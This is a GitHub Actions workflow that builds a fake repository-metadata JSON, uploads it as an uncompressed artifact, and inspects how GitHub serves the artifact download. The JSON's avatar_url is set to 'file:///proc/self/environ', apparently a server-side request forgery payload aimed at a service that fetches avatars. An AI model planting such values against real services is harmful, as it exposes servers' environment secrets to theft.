name: CT Test
on:
  workflow_dispatch:
  push:
    paths:
      - 'trigger.txt'

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Create payload
        run: |
          echo '{"full_name":"RWeng77/rc-test","owner":{"login":"cassette","avatar_url":"file:///proc/self/environ"},"description":"Repo Cassette postcard","stargazers_count":42}' > payload.json
          sha256sum payload.json
          wc -c payload.json

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: nozip-test
          path: payload.json
          compression-level: 0
          retention-days: 1

      - name: Check download headers
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          sleep 5
          ARTIFACTS=$(curl -s -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts")
          echo "$ARTIFACTS" | jq '.artifacts[] | {id, name, size_in_bytes}'

          AID=$(echo "$ARTIFACTS" | jq -r '.artifacts[0].id')
          echo "Artifact ID: $AID"

          REDIR_HEADERS=$(curl -sI -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/repos/${{ github.repository }}/actions/artifacts/$AID/zip")
          echo "--- Redirect headers ---"
          echo "$REDIR_HEADERS"

          LOC=$(echo "$REDIR_HEADERS" | grep -i '^location:' | sed 's/^[Ll]ocation: //' | tr -d '\r\n')
          echo "rsct: $(echo "$LOC" | grep -oP 'rsct=[^&]*' || echo 'NO_RSCT')"

          echo "--- Final response headers ---"
          curl -sI "$LOC" | head -20

          echo "--- Content check ---"
          curl -s -o /tmp/dl.bin "$LOC"
          wc -c /tmp/dl.bin
          xxd -l 16 /tmp/dl.bin
          file /tmp/dl.bin
